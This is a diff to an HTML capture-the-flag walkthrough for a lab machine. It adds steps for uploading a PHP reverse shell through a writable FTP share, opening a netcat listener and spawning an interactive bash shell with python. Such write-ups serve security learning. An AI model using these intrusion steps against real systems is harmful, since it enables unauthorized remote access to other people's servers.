@@ -142,11 +142,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 <p>After moving to the newly discovered directory it clearly shows the ftp server!</p>
 
 
-<img src="pictures/StartUp_gobuster.png">
+
+<img src="pictures/StartUp_dir.png">
+
 
 
 <p>And if we remember from our nmap scan ftp folder is WRITABLE!! That means we can upload reverse shell and get into the machine!<p>
-<p>I will be using <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentest monkey’s php reverse shell and upload it to ftp.</a></p>
+<p>I will be using <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentest monkey’s php reverse shell</a> and upload it to ftp.</p>
 <pre><code>
 $ ftp 10.10.104.34
 Connected to 10.10.104.34.
@@ -173,8 +175,11 @@ ftp> ls
 ftp> exit
 221 Goodbye.
 </pre></code>
-<p>Set up a netcat connection 
-
-
-
-
+<p>Next set up a netcat connection and execute php reverse shell on the website</p>
+<pre><code>$ nc -lvnp &lt;port&gt; </code></pre>
+<p>Lets get a fully interactive shell.</p>
+<pre><code>
+$ which python
+/usr/bin/python
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+</pre></code>
